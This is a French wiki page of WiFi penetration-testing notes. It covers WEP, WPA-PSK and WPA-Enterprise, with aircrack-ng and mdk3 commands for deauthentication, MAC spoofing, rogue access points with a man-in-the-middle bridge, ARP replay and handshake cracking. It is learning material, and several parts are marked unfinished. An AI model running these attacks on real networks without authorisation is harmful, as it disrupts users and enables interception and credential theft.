---
title: Wifi
permalink: /Wifi/
---

# Wifi

Cette page présente différentes méthodologies pour les tests d'intrusion sur des équipements et des réseaux WiFi. Il est en grande partie basé sur le cours [Wireless LAN Security and Penetration Testing Megaprimer](http://www.securitytube.net/groups?operation=view&groupId=9) de Vivek Rachamandran de SecurityTube ainsi que sur le livre **Kali Linux Wireless Penetration Testing**.

Généralités
-----------

### Terminologie

STA - STAtion (Client)

BSS - Basic Service Set (ensemble de noeuds communicants entre eux)

-   Infrastructure BSS (AP et clients)
-   Independant BSS (Réseau Ad-hoc)

ESS - Extended Service Set (ensemble de BSS)

BSSID - Basic Service Set Identifier

-   Infrastructure: le BSSID est l'adresse MAC de l'AP
-   Independent: le BSSID est la MAC du premier client sur le mode ad-hoc

DS: Distribution system (fait le lien entre les BSS)

### Matériel

Le matériel suivant est nécessaire pour effectuer des tests sur un réseau WiFi:

-   Un PC ou une VM sous Kali.
-   Une carte Wifi pouvant être mise en mode monitor. Il est recommandé de faire une rapide recherche sur google avant de se lancer dans l'utilisation d'une carte afin d'avoir un retour de la communauté sur celles-ci. Il sera parfois nécessaire d'installer des drivers spécifiques.

De plus les éléments suivants peuvent permettre de s'entraîner:

-   Un point d'accès Wifi qui peut être configuré (pour tester avec WEP, WPA2, etc.)
-   Un client pouvant se connecter en Wifi (PC, téléphone ou autre)

### Problèmes courants

Plusieurs éléments à prendre en compte:

-   Il peut arriver que aircrack ou Wireshark loupe des paquets lors de la capture.
-   Il peut arriver que la carte Alfa "crashe" quand on envoie trop de paquets. Ceci est apparemment dû à des problèmes de liaison USB et serait à priori un problème assez présent si on passe par une VM.

Mise en place
-------------

On peut lister les interfaces Wifi disponibles:

``` bash
airmon-ng
```

Pour supprimer les processus qui pourraient poser problèmes:

``` bash
# airmon-ng check
Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

  PID Name
  718 NetworkManager
  870 dhclient
 1104 avahi-daemon
 1105 avahi-daemon

# airmon-ng check kill
Killing these processes:

  PID Name
  870 dhclient
 1115 wpa_supplicant
```

On peut ensuite monter une interface en mode monitor:

``` bash
airmon-ng start wlan0
```

Changer le channel de la carte:

``` bash
iwconfig wlan0mon channel 1
```

Ecoute passive
--------------

L'outil **airodump** permet d'identifier les AP et clients à portée. Par défaut, airodump itère sur les différents channels et risque donc de louper de nombreux paquets:

``` bash
airodump-ng wlan0mon
```

Il est possible de faire des attaques plus ciblées en précisant le channel (--channel 1) ou le BSSID (--bssid AA:AA:AA:AA:AA:AA)

``` bash
airodump-ng wlan0mon --channel 1 --bssid AA:AA:AA:AA:AA:AA
```

MDK
---

MDK est un utilitaire pour exploiter certaines vulnérabilités liées au Wi-Fi

### Beacon Flood

Il est possible d'envoyer un grand nombre de beacons frames de manière automatique:

``` bash
mdk3 wlan0mon b -n PwnMe -m
```

Hidden SSID
-----------

Le concept d'hidden SSID consiste à ne pas afficher le SSID dans les Beacon Frame. Le champ correspondant est nul et Wireshark affiche "**SSID=Broadcast**".

Cependant ceci ne cache que le SSID dans les **Beacon Frames**, il est toujours possible de les voir dans les requêtes d'associations et dans les *Probe Request*/*Probe Response*.

Il est possible de récupérer ces informations de manière passive (on attend une requête légitime) ou active (on fait une attaque active pour desassocier un utilisateur légitime et on voit ensuite une requête légitime).

### Attaque Passive

On peut utiliser **airodump-ng** pour monitorer l'AP qui nous intéresse. Si un *Probe Request*/*Probe Response* associé est détecté alors airodump affichera le SSID envoyé.

``` bash
airodump-ng wlan0mon --channel 1 --bssid 00:21:91:D2:8E:25
```

### Attaque Active

On peut utiliser **aireplay-ng** pour effectuer des desassociations sur les clients et ainsi provoquer des *Probe Request*/*Probe Response*. Il est possible de faire ceci en broadcast ou en ciblant des clients précis. Dans l'exemple suivant on envoie ces requêtes en broadcast (*--deauth 0*):

``` bash
aireplay-ng --deauth 0 -a 00:21:91:D2:8E:25
```

MAC Filters
-----------

Dans certains des filtres par adresse MAC sont utilisés pour autoriser seulement certaines machines.

### Cas d'un WiFi ouvert

Dans le cas d'un Wifi ouvert n'autorisant que certaines adresses MAC, une erreur sera renvoyée dans le paquet WLAN si on n'a pas la bonne adresse MAC. On peut tester ceci avec **aireplay-ng**.

La requête suivante permet de tenter de se connecter. S'il n'y a pas de filtrage alors on doit obtenir une connexion:

``` bash
aireplay-ng --fakeauth 10 -a 00:21:91:D2:8E:25 wlan0mon
```

Sinon il est possible de tester en spoofant l'adresse MAC légitime:

``` bash
aireplay-ng --fakeauth 10 -a 00:21:91:D2:8E:25 -h 91:21:DE:1D:A2 wlan0mon
```

Pour récupérer des adresses MAC valides il suffit de regarder les clients associés avec airodump-ng. On peut ensuite utiliser **macchanger** pour avoir la bonne adresse MAC.

WLAN Authentication
-------------------

Il y a plusieurs modes d'authentification:

-   **Open Authentication**: accès direct. Parfois un filtrage par MAC.
-   **Shared Authentication**: utilisation d'un secret partagé

### Shared Authentication avec WEP

**Attention**: partie à revoir L'authentification se base sur un mécanisme de challenge-response:

-   Client -&gt; AP: Envoie d'une requête d'authentification
-   AP -&gt; Client: Envoie d'un challenge de 128 bits
-   Client: Chiffre le challenge avec RC4
-   Client -&gt; AP: Envoie le challenge chiffré, ainsi que l'IV
-   AP: Déchiffre le challenge
-   AP -&gt; Client: confirme que l'authentification s'est bien déroulée

On peut récupérer cet échange avec airodump-ng:

``` bash
airodump-ng --channel 8 --bssid 19:AB:D3:1C:DD --write output
```

Il est ensuite possible d'utiliser l'échange pour bypasser l'authentification.

**Attention**: un problème avec airodump-ng qui ne récupère pas correctement les échanges. On les voie cependant correctement avec Wireshark.

Faux point d'accès
------------------

Cette section regroupe différente méthodes pour créer des faux points d'accès. La création d'un faux point d'accès permet différentes actions:

-   Mettre en place des attaques de type Man in the middle en se faisant passer pour un point d'accès légitime.
-   Récupérer des informations d'authentification (ex: challenge / responses pour faire du cracking offline).
-   Attaquer les clients qui se connectent automatiquement.

### Mode ouvert ou WEP

Le point d'accès peut se créer avec la suite aircrack. Dans l'exemple suivant on crée un point d'accès en mode ouvert:

``` bash
airbase-ng --essid Wireless_Test -a AA:AA:AA:AA:AA:AA -c 3 wlan0mon
```

Il est ensuite possible de se mettre en man in the middle en créant un pont entre l'interface du fake AP et une connexion au réseau. Lors de la création de l'AP, une interface **at0** apparaît. Il est possible de créer un pont entre celle-ci et eth0 (ou autre):

``` bash
brctl addbr mitm
brctl addif mitm eth0
brctl addif mitm at0
```

Il faut éventuellement installer bridge-utils

``` bash
apt-get install bridge-utils
```

Si on cherche à usurper un point d'accès déjà présent, on peut forcer la déconnexion des utilisateurs présents sur celui-ci:

``` bash
aireplay-ng --deauth 0 -a 00:21:91:D2:8E:25 wlan0mon # envoi en broadcast
aireplay-ng --deauth 0 -a 00:21:91:D2:8E:25 -c AB:CD:EF:01:12:12 wlan0mon # cible un client précis
```

### Répondre aux probes

Les clients envoient régulièrement des **probes** pour identifier si les réseaux auxquels ils ont l'habitude de se connecter sont présents. Il est possible d'utiliser ce comportement pour un attaquer un client en répondant au probe (ceci est notamment dû au fait que le client n'authentifie pas l'access point)

On peut faire ceci pour un réseau particulier:

``` bash
airbase-ng --essid Wireless_Test -a AA:AA:AA:AA:AA:AA -c 3 wlan0mon
```

Alternativement on peut répondre à tous les probes request (-P) et ensuite envoyer des beacons frames (-C 10 seconds):

``` bash
airbase-ng -P -C 10 -a AA:AA:AA:AA:AA:AA -c 3 wlan0mon
```

Wired Equivalent Privacy (WEP)
------------------------------

Wired Equivalent Privacy (WEP) est un protocole permettant des échanges WiFi **chiffrés** afin d'éviter l'interception des messages échangés. De plus ce mécanisme permet également de gérer l'authentification auprès de l'AP. Quelques proprités importantes:

-   Les clés WEP font 40 ou 104 bits, on y ajoute un IV de 24 bits (donc 64 ou 128 bits au total).
-   La combinaison IV + WEP est utilisée pour générer une clé de chiffrement, différente à chaque message (l'IV change à chaque message).
-   La clé de chiffrement est utilisée pour chiffrer / déchiffrer le message avec un simple XOR.

WEP est considéré comme cassé. Il est possible de récupérer la clé WEP en sniffant un grand nombre d'échanges légitimes. Il est nécessaire de récupérer un grand nombre d'IV afin de cracker la clé. En effet certains IV permettent d'obtenir des informations sur la clé, mais seul certains IV "faibles" permettent ceci.

### Cracker WEP

Dans le cas où on a accès à l'AP, il faut d'abord commencer à sniffer le traffic emis vers l'AP:

``` bash
airodump-ng wlan0mon --channel 3 --bssid F4:F2:6D:3F:DA:A4 --write WepCracking
```

Si de nombreux échanges ont lieu entre des clients et l'AP il sera possible de se contenter d'une écoute passive pour récupérer les échanges (~5-10 000). Dans le cas où il n'y a que très peu d'échanges il est possible de forcer l'AP à envoyer des paquets qui contiendront donc des IV.

Pour cela l'outil aireplay peut être utiliser pour rejouer des requêtes ARP. Il est possible d'identifier des paquets ARP envoyés en se basant sur la taille des données chiffrées. Dès qu'on identifie un paquet ARP chiffré on le renvoie, ce qui provoque une réponse de l'AP.

La commande suivante permet d'identifier et de rejouer une requête ARP. Il est important de préciser l'adresse MAC d'un client valide dans le paramètre **-h**:

``` bash
aireplay-ng --arpreplay wlan0mon -b F4:F2:6D:3F:DA:A4 -h 10:A5:D0:15:B0:C7
```

Si aucune requête ARP n'est trouvée, il est possible de faire une desauthentification pour forcer les clients à se reconnecter, ce qui devrait provoquer des requêtes ARP:

``` bash
aireplay-ng --deauth 0 wlan0mon -a F4:F2:6D:3F:DA:A4
```

Il suffit ensuite d'attendre un peu puis de lancer le cracking avec aicrack-ng:

``` bash
aircrack-ng WepCracking-01.cap
```

### Attaque Caffe Latte

Cette attaque permet de cracker la clé WEP sans être proche de l'AP. L'idée générale est la suivante:

-   Un client envoie un **Probe Request** pour le réseau **TARGET** qui protége ses communications avec WEP.
-   L'attaquant simule le point d'accès **TARGET**.
-   Le client se connecte automatiquement au faux point d'accès. L'attaquant n'a pas besoin de connaître la clé WEP pour valider l'authentification.
-   Le client envoie des requêtes DHCP pour obtenir une adresse IP. En l'absence de réponse il finit par envoyer un **Gratuitous ARP** pour indiquer qu'il veut prendre l'IP X.X.X.X (ex: Who has X.X.X.X ? Tell 0.0.0.0)
-   Il est alors possible de forger un faux paquet ARP à destination de X.X.X.X (l'IP prise par le client) et obtenir des réponses contenant des IV différents.

#### En pratique

Les tests n'ont pas fonctionnés. A revoir.

### Autres attaques

D'autres attaques existent sur WEP:

-   Attaque Chop Chop de Korek: permet de déchiffre un paquet sans récupérer la clé WEP
-   Attaque Hirte: variation de l'attaaque Caffe Latte utilisant la fragmentation

### Attaque par brute force

Il est possible d'effectuer des attaques par brute force pour trouver la clé. Pour cela on a juste besoin d'un paquet ! Il est ensuite possible d'effectuer des attaques par brute force, les clés possibles ayant les contraintes suivantes:

-   Taille fixes (40/104 bits -&gt; 5 ou 13 caractères)
-   Potentiellement la clé au format "hex" a un sens (ex: 0xdead1)

Wifi Protected Access Pre Shared Key (WPA-PSK)
----------------------------------------------

### Généralités

Ce mode de chiffrement des communications Wifi a pour but de remplace WEP et de faire la transition entre WEP et WPA2. Quelques propriétés intéressantes:

-   WPA utilise une passphrase (entre 8 et 63 caractères) qui doit être connue du client et de l'AP
-   Passphrase utilisée pour générer la Pre-Sgared Key (PSK) de 256 bits avec PBKDF2. Les paramètres utilisés par PBKDF2 sont:
    -   La passphrase
    -   Le SSID de l'AP et sa longueur (ceci permet d'empêcher les attaques précalculées)
    -   Un nombre de passe pour le hachage (4096)
    -   La longueur de sortie 256
-   La PSK n'est pas utilisée directement, mais sera utilisée pour générer une Pairwise Transient Key (PTK) pour la session. Cette PTK sera générée à partir de la PSK, des adresses MAC ainsi que de nonces cryptographiques.

### Authentification

L'authentification commence par les probe request / response, messages d'authentification (en mode **open**) et les messages d'associations. Il y a ensuite un Handshake constitué de 4 messages (messages EAPOL dans Wireshark):

1.  **AP -&gt; Client**: Envoi d'un nonce cryptographique (nonceA)
2.  **Côté Client**: Le client calcule la **Pairwise Transient Key** (PTK) à partir de nonceA, d'un nonce qu'il génére (nonceS), des adresses MAC (client et AP) et de la PSK.
3.  **Client -&gt; AP**: Envoi de nonceS ainsi que du Message Integrity Code (MIC) qui est calculé à partir de la PTK.
4.  **Côté AP**: L'AP calcule la PTK à partir de nonceA, nonceB, PSK et des adresses MAC. Il vérifie ensuite le MIC.
5.  **AP -&gt; Client**: Envoi d'un **Install Key** message si tous s'est bien passé, sinon d'un **Deauthentication message**.
6.  **Client -&gt; AP**: Envoi d'un **Key Install Acknowledgement**

### Attaques par Brute-Force

Il est possible d'effectuer des attaques par brute force en mode offline pour retrouver la passphrase. Il faut pour cela récupérer l'handshake entre un client et l'AP. Pour cela on peut utiliser airodump-ng:

``` bash
airodump-ng --bssid D0:84:B0:00:C2:B0 wlan0mon --channel 1 --write apture
```

On peut arrêter la capture dès qu'on a une indication de la capture de l'handshake:

``` bash
 CH  1 ][ Elapsed: 12 s ][ 2016-05-31 11:25 ][ WPA handshake: D0:84:B0:00:C2:B0

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 D0:84:B0:00:C2:B0  -28 100      114      262   57   1  54e  WPA2 CCMP   PSK  Bbox-86417B1E

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 D0:84:B0:00:C2:B0  FC:F8:AE:5B:AA:04  -18    1e- 0e   156      152
 D0:84:B0:00:C2:B0  A0:F8:95:21:81:3C  -20    0e- 1      0      104
```

Il est alors possible de lancer une attaque par bruteforce avec aircrack-ng. Il faut spécifier le fichier dans lequel on a stocké la capture airodump et une wordlist (**Rappel**: entre 8 et 63 caractères):

``` bash
aircrack-ng output-01.cap -w wordlist
```

(**A revoir**)Il est ensuite de déchiffrer les données avec airdecap-ng:

``` bash
airdecap-ng --bssid D0:84:B0:00:C2:B0 wlan0mon -p PASSPHRASE output.cap
```

Wifi Protected Access 2 Pre Shared Key (WPA2-PSK)
-------------------------------------------------

Le fonctionnement est similaire à WPA-PSK.

### Attaques par Brute-Force

TODO

WPA-Enterprise
--------------

WPA-Enterprise fonctionne avec un serveur d'authentification (ex: FreeRadius) qui authentifie les utilisateurs cherchant à accéder au réseau WiFi. On a donc trois éléments:

-   Le **Supplicant** qui correspond au client
-   L**'Authenticator** qui correspond à l'Access Point
-   Le **Authentication server** qui correspond au serveur Radius

Utilisation EAP: <https://layer3.wordpress.com/2009/08/16/eap-authentication-protocols/>

### Protected Extensible Authentication Protocol (PEAP)

-   PEAPv0 avec EAP-MSCHAPv2 (supporté nativement sous Windows)
-   PEAPv1 avec EAP-GTC (moins populaire)
-   PEAPv0/v1 avec EAP-SIM (peu courant)

PEAP utilise des certificats serveurs pour la validation du serveur.

PEAP-EAP-TLS utilise également des certificats clients (supporté nativement par Windows).

On a:

-   Création d'un tunnel SSL/TLS
-   Authentification avec MSCHAPv2 dans le tunnel sécurisé

### EAP-TTLS

Standard ouvert. Certificat côté serveur et possibilité d'utiliser des certificats côté client. Pas de support natif sous Windows. EAP-TTLSv0 & EAP-TTLSv1

### EAP-TLS

Obligation d'avoir certificats côté client ET serveur (complexité de mise en place). Cependant cette méthode permet de s'assurer que seuls des postes autorisés ont accès au réseau WiFi.

### LEAP

Créé par Cisco (propriétaire). Vulnérable à des attaques par dictionnaire. Utilisation d'une version modifiée de MSCHAP. Mécanisme de challenge / response en plain text

Recommandation de migrer vers EAP-FAST

### EAP-FAST

Remplacement de LEAP avec certificats côté serveur (optionnel). Utilisation de **Protected Access Credential** PAC pour créer un tunnel TLS. Authentification dans ce tunnel.

Vulnérable.

### Commandes

Il est possible d'avoir les informations sur les WiFi disponibles avec netsh. Ceci permet notamment d'avoir si on a un WiFi utilisant des certificats clients ou juste une authentification normale:

``` text
netsh wlan show profiles name=[profile name]
```

Références
----------

-   [Notes sur Wi-Fi Security Megaprimer](http://41j.com/blog/2011/10/securitytube-wireless-lan-security-megaprimer-notes-parts-1-to-4/)
- [Wi-Fi ENterprise](http://securitysynapse.blogspot.fr/2014/03/wireless-pentesting-on-cheap-kali-WPAEntPartII.html)


